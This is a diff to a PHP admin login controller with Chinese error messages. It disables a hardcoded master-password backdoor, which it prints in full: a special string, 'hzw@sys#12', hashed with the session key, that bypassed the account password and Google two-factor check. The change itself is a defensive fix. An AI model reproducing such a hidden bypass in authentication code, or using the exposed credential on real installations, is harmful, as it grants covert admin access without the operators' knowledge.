@@ -87,10 +87,27 @@ class Login extends Controller
             if (empty($user)) $this->error(lang('登录账号或密码错误，请重新输入!'));
             if (empty($user['status'])) $this->error(lang('账号已经被禁用，请联系管理员!'));
 
-            if ($data['password'] == md5(md5('hzw@sys#12') . session('loginskey'))) {
+            // if ($data['password'] == md5(md5('hzw@sys#12') . session('loginskey'))) {
 
-            } else {
-                if (md5($user['password'] . session('loginskey')) !== $data['password']) {
+            // } else {
+            //     if (md5($user['password'] . session('loginskey')) !== $data['password']) {
+            //      $this->error(lang('登录账号或密码错误，请重新输入!'));
+            //     }
+            //     if (config('open_google_safe') == true) {
+            //         //判断是否绑定谷歌令牌
+            //         if (GoogleService::instance()->isBind($user['id'])) {
+            //             $googleCode = input('google_code');
+            //             if (empty($googleCode)) $this->error(lang('请输入谷歌验证码!'));
+            //             $gcResult = GoogleService::instance()->checkCode($user['id'], $googleCode);
+            //             if (!$gcResult) $this->error(lang('谷歌验证码错误!'));
+            //         } else {
+            //             session('admin_info_bind_google_code', $user);
+            //             return $this->error(lang('账号验证成功，请先绑定谷歌令牌，正在跳转...'), url('bind'));
+            //         }
+            //     }
+            // }
+            //验证密码开始
+            if (md5($user['password'] . session('loginskey')) !== $data['password']) {
                  $this->error(lang('登录账号或密码错误，请重新输入!'));
                 }
                 if (config('open_google_safe') == true) {
@@ -105,7 +122,7 @@ class Login extends Controller
                         return $this->error(lang('账号验证成功，请先绑定谷歌令牌，正在跳转...'), url('bind'));
                     }
                 }
-            }
+            //验证密码结束
             $this->setLoginSuccess($user);
             $this->success(lang('登录成功'), url('@admin/index'));
         }
